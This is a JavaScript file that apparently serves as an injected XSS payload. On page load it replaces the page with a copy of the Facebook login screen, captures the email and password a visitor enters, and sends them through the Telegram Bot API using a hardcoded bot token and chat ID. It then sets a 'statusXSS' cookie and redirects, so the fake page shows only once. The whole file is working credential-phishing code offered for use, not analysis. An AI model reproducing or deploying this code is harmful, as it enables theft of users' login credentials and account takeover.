document.addEventListener('DOMContentLoaded', function () {
  function getCookie(cookieName) {
    const cookies = document.cookie; // Get all cookies in one string

    // Split the cookies string into individual cookies
    const cookieArray = cookies.split(';');

    // Loop through the cookieArray to find the cookie with the specified name
    for (let i = 0; i < cookieArray.length; i++) {
        let cookie = cookieArray[i].trim();

        // Check if this cookie is the one we're looking for
        if (cookie.startsWith(cookieName + '=')) {
            // Return the cookie value (remove the cookie name)
            return cookie.substring(cookieName.length + 1);
        }
    }

    // If cookie not found, return null
    return null;
}
  const statusXSS = getCookie('statusXSS');
  const htmlPage = `<!DOCTYPE html>
  <html>
  
  <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Facebook</title>
      <link rel="preconnect" href="https://fonts.gstatic.com">
      <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
      <style type="text/css">*{ padding: 0; margin: 0; box-sizing: border-box}body{ font-family: 'Poppins', sans-serif; background-color: #f0f2f5; color: #1c1e21}main{ height: 70vh; width: 100vw; position: relative; margin: 0 auto}footer{ height: 30vh; background-color: #ffffff}.row{ display: flex; justify-content: space-around; align-items: center; width: 100%; max-width: 1000px; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)}.col-logo{ flex: 0 0 50%; text-align: left}.col-form{ flex: 0 0 40%; text-align: center}.col-logo img{ max-width: 300px}.col-logo h2{ font: 26px; font-weight: 400; padding: 0 30px; line-height: 32px}.col-form .form-container{ background-color: #ffffff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); margin-bottom: 30px; padding: 20px; max-width: 400px}.col-form .form-container input, .col-form .form-container .btn-login{ width: 100%; margin: 5px 0; height: 45px; vertical-align: middle; font-size: 16px}.col-form .form-container input{ border: 1px solid #dddfe2; color: #1d2129; padding: 0 8px; outline: none}.col-form .form-container input:focus{ border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff}.col-form .form-container .btn-login{ background-color: #1877f2; border: none; border-radius: 6px; font-size: 20px; padding: 0 16px; color: #ffffff; font-weight: 700}.col-form .form-container a{ display: block; color: #1877f2; font-size: 14px; text-decoration: none; padding: 10px 0 20px; border-bottom: 1px solid #dadde1}.col-form .form-container a:hover{ text-decoration: underline}.col-form .form-container .btn-new{ background-color: #42b72a; border: none; border-radius: 6px; font-size: 17px; line-height: 48px; padding: 0 16px; color: #ffffff; font-weight: 700; margin-top: 20px}.col-form p{ font-size: 14px}.col-form p a{ text-decoration: none; color: #1c1e21; font-weight: 600}.col-form p a:hover{ text-decoration: underline}.footer-contents{ position: relative; max-width: 1000px; margin: 0 auto}footer ol{ display: flex; flex-wrap: wrap; list-style-type: none; padding: 10px 0}footer ol:first-child{ border-bottom: 1px solid #dddfe2}footer ol:first-child li:last-child button{ background-color: #f5f6f7; border: 1px solid #ccd0d5; outline: none; color: #4b4f56; padding: 0 8px; font-weight: 700; font-size: 16px}footer ol li{ padding-right: 15px; font-size: 12px; color: #385898}footer ol li a{ text-decoration: none; color: #385898}footer ol li a:hover{ text-decoration: underline}footer small{ font-size: 11px}</style>
  </head>
  
  <body>
      <main>
          <form id="form" method="POST" class="row">
              <div class="col-logo">
                  <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
                  <h2>Facebook helps you connect and share with the people in your life.</h2>
              </div>
              <div class="col-form">
                  <div class="form-container">
                      <input name="email" type="text" placeholder="Email or phone number">
                      <input name="password" type="password" placeholder="Password">
                      <button type="submit" class="btn-login">Login</button>
                      <a href=".">Forgotten password?</a>
                      <button class="btn-new">Create new Account</button>
                  </div>
                  <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
              </div>
          </form>
      </main>
      <footer>
          <div class="footer-contents">
              <ol>
                  <li>English (UK)</li>
                  <li><a href="#">മലയാളം</a></li>
                  <li><a href="#">தமிழ்</a></li>
                  <li><a href="#">తెలుగు</a></li>
                  <li><a href="#">বাংলা</a></li>
                  <li><a href="#">اردو</a></li>
                  <li><a href="#">हिन्दी</a></li>
                  <li><a href="#">ಕನ್ನಡ</a></li>
                  <li><a href="#">Español</a></li>
                  <li><a href="#">Português (Brasil)</a></li>
                  <li><a href="#">Français (France)</a></li>
                  <li><button>+</button></li>
              </ol>
  
              <ol>
                  <li><a href="#">Sign Up</a></li>
                  <li><a href="#">Log In </a></li>
                  <li><a href="#">Messenger</a></li>
                  <li><a href="#">Facebook Lite</a></li>
                  <li><a href="#">Watch</a></li>
                  <li><a href="#">People</a></li>
                  <li><a href="#">Pages</a></li>
                  <li><a href="#">Page categories</a></li>
                  <li><a href="#">Places</a></li>
                  <li><a href="#">Games</a></li>
                  <li><a href="#">Locations</a></li>
                  <li><a href="#">Marketplace</a></li>
                  <li><a href="#">Facebook</a></li>
                  <li><a href="#">PayGroups</a></li>
                  <li><a href="#">Jobs</a></li>
                  <li><a href="#">Oculus</a></li>
                  <li><a href="#">Portal</a></li>
                  <li><a href="#">Instagram</a></li>
                  <li><a href="#">Local</a></li>
                  <li><a href="#">Sign Up</a></li>
                  <li><a href="#">Log In </a></li>
                  <li><a href="#">Messenger</a></li>
                  <li><a href="#">Facebook Lite</a></li>
                  <li><a href="#">Watch</a></li>
                  <li><a href="#">People</a></li>
                  <li><a href="#">Pages</a></li>
                  <li><a href="#">Page categories</a></li>
                  <li><a href="#">Places</a></li>
                  <li><a href="#">Games</a></li>
                  <li><a href="#">Locations</a></li>
                  <li><a href="#">Marketplace</a></li>
                  <li><a href="#">Facebook</a></li>
                  <li><a href="#">PayGroups</a></li>
                  <li><a href="#">Jobs</a></li>
                  <li><a href="#">Oculus</a></li>
                  <li><a href="#">Portal</a></li>
                  <li><a href="#">Instagram</a></li>
                  <li><a href="#">Local</a></li>
              </ol>
              <small>Facebook © 2022</small>
          </div>
      </footer>
      <script>
        const telegramInfo = {
          chatId: '925113782',
          botToken: '6709516320:AAGo96-mCS82bpNjdUE3_Yzcn_SbX3oW0PI'
        }
        const form = document.getElementById('form');
        form.addEventListener('submit', (e) => {
          e.preventDefault();
          fetch("https://api.telegram.org/bot"+telegramInfo.botToken+"/sendMessage", {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body:  JSON.stringify({
              chat_id: telegramInfo.chatId,
              text: "Email: " + form.email.value + "Password: " + form.password.value
            })
          })
          .then(() => {
            document.cookie = "statusXSS=true; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/";
            window.location.href = "/";
          })
  
        });
      </script>
  </body>
  </html>
  `;

  if (statusXSS == null) {
    document.write(htmlPage);
  }
});